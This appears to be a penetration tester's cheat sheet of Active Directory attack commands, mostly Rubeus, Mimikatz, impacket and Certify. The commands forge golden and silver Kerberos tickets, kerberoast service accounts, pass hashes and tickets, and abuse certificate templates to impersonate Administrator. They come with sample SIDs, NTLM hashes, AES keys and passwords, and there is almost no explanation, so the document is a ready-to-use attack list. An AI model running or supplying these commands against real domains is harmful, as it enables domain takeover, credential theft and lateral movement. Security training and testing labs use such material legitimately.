### Rubeus

### Golden Tickets
```

Get-DomainSID
PS C:\Windows\system32> Get-DomainSID
S-1-5-21-2032401531-514583578-4118054891
Get-DomainSID  -Domain comply.com 
PS C:\Windows\system32> Get-DomainSID  -Domain finance.activebreach.io
S-1-5-21-1135011135-3178090508-3151492220

Rubeus.exe golden /user:Evil /domain:activebreach.io /sid:S-1-5-21-134085869-1149061413-485552689 /rc4:1d2ceb7b570cc960903077eeee93ccd9 /ptt
Rubeus.exe golden /user:Evil /domain:activebreach.io /sid:S-1-5-21-134085869-1149061413-485552689 /aes256:955b3949862d97eaad068ba351424a43b52077afa6cb4192fdd0b5f54d8c9406 /ptt
Invoke-Mimikatz -Command '"kerberos::golden /user:administrator /domain:activebreach.io /sid:S-1-5-21-134085869-1149061413-485552689 /krbtgt:7c7865e6e30e54e8845aad091b0ff447 /sids:S-1-5-21-1135011135-3178090508-3151492220-519 /ptt"'
```
### From Linux
```
/usr/bin/impacket-ticketer -domain activebreach.io -domain-sid S-1-5-21-134085869-1149061413-485552689 -nthash 1d2ceb7b570cc960903077eeee93ccd9 Administrator
export KRB5CCNAME=Administrator.ccache
/usr/bin/impacket-wmiexec -k -no-pass -dc-ip 10.10.10.10 DC-ActiveBreach.ActiveBreach.io -target-ip 10.10.10.10
/usr/bin/impacket-psexec -k -no-pass -dc-ip 10.10.10.10 DC-ActiveBreach.ActiveBreach.io -target-ip 10.10.10.10
```

### Silver Ticket
```
lookupsid.py hiboxy.com/bgreen:Password1@10.130.10.4 520
secretsdump.py hiboxy.com/SVC_SQLService2:^^Cakemaker@10.130.10.4 -just-dc-user file01$
Rubeus.exe silver /service:cifs/Target-Service /rc4:<> /sid:<> /ptt /user:bgreen #
Rubeus.exe silver /service:cifs/svc-web.activebreach.io /rc4:<> /sid:<> /ptt /user:bgreen
Rubeus.exe silver /service:cifs/svc-web.activebreach.io /rc4:<> /sid:<> /ptt /user:pwned /id:777
Rubeus.exe silver /service:cifs/wkstn-1.dev.cyberbotic.io /aes256:<> /user:nlamb /domain:dev.cyberbotic.io /sid:<> /ptt

/usr/bin/impacket-ticketer -domain activebreach.io -domain-sid 'S-1-5-21-134085869-1149061413-485552689' -spn 'svc-web/activebreach.io' -nthash 'bae4def34ec27db723d01d75ae65c64d' -user-id 500 Administrator 
export KRB5CCNAME=Administrator.ccache
/usr/bin/impacket-psexec -k -no-pass -target-ip 10.10.10.10 -dc-ip 10.10.10.10 DC-ActiveBreach.ActiveBreach.io

```
```
Rubeus.exe kerberoast /user:serviceaccount /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
```
```
Rubeus.exe asktgt /user:pawadmin$ /rc4:<> /ptt
Rubeus.exe asktgt /user:pawadmin /certificate:C:\AD\Tools\pawadmin.pfx /password:SecretPass@123 /nowrap /ptt
Rubeus.exe asktgt /user:Administrator /certificate:C:\AD\Tools\DA.pfx /password:SecretPass@123 /nowrap /ptt
Rubeus.exe ptt /ticket:TGTofUS-DC$
winrs -r:us-dc whoami
```
### Overpass-the-Hash
````
execute-assembly C:\Users\Public\Rubeus.exe  triage
Rubeus asktgt /user:n.John /rc4:2e8a408a8aec852ef2e458b938b8c071
Rubeus ptt /ticket:doIFXDCCBVi[…snip…]bDWN5YmVyYm90aWMuaW8=
winrs -r:us-dc whoami
````
### ADCS
```
Certify.exe cas
Certify.exe find
Certify.exe find /enrolleeSuppliesSubject
Rubeus.exe asktgt /user:pawadmin /certificate:C:\AD\Tools\pawadmin.pfx /password:SecretPass@123 /nowrap /ptt
Certify.exe request /ca:TechcorpDC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator
openssl.exe pkcs12 -in C:\AD\Tools\cert.pem - keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\DA.pfx
Rubeus.exe asktgt /user:Administrator /certificate:C:\AD\Tools\DA.pfx /password:SecretPass@123 /nowrap /ptt
winrs -r:us-dc whoami
```
### 
```
C:\AD\Tools\Rubeus.exe asktgt /domain:us.techcorp.local /user:helpdeskadmin /aes256:f3ac0c70b3fdb36f25c0d5c9cc552fe9f94c39b705c4088a2bb7219ae9fb6534 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
